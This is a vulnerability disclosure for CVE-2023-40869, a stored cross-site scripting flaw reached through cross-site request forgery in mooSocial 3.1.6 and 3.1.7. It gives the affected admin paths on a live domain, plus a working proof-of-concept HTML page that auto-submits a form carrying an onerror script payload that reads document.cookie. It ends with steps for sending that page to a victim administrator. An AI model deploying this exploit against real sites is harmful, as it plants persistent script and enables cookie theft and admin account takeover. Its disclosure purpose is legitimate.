
# CVE-2023-40869
Cross Site Scripting vulnerability in mooSocial mooSocial Software v.3.1.6 and 3.1.7 allows a remote attacker to execute arbitrary code via a crafted script to the edit_menu, copuon, and group_categorias functions

XSS STORE via CSRF.

#Paths Affected
http://admin-socialcommerce.moosocial.com/admin/group/group_categories
http://admin-socialcommerce.moosocial.com/admin/coupon/
http://admin-socialcommerce.moosocial.com/admin/menu/manage/edit_menu/6

Poc:

1 - Make a file with this HTML and with and include XSS PAYLOAD

<html>
  <body>
    <form action="http://admin-socialcommerce.moosocial.com/admin/group/group_categories/save" method="POST">
      <input type="hidden" name="data&#91;id&#93;" value="" />
      <input type="hidden" name="data&#91;name&#93;" value="test&quot;&gt;&lt;img&#32;src&#61;a&#32;onerror&#61;alert&#40;document&#46;cookie&#41;&gt;test" />   ##payload in this example and encoded : test"><img src=a onerror=alert(document.cookie)>test
      <input type="hidden" name="data&#91;type&#93;" value="Group" />
      <input type="hidden" name="data&#91;header&#93;" value="0" />
      <input type="hidden" name="data&#91;header&#93;" value="1" />
      <input type="hidden" name="data&#91;parent&#95;id&#93;" value="0" />
      <input type="hidden" name="data&#91;description&#93;" value="" />
      <input type="hidden" name="data&#91;active&#93;" value="0" />
      <input type="hidden" name="data&#91;active&#93;" value="1" />
      <input type="hidden" name="data&#91;everyone&#93;" value="0" />
      <input type="hidden" name="data&#91;everyone&#93;" value="1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

2 - Example test.html

3 - Send to the victim

4 - When the victim open the html the file test.html will open in his navigator and when he will open and press click the code will inject a payload and will be store at the DataBase
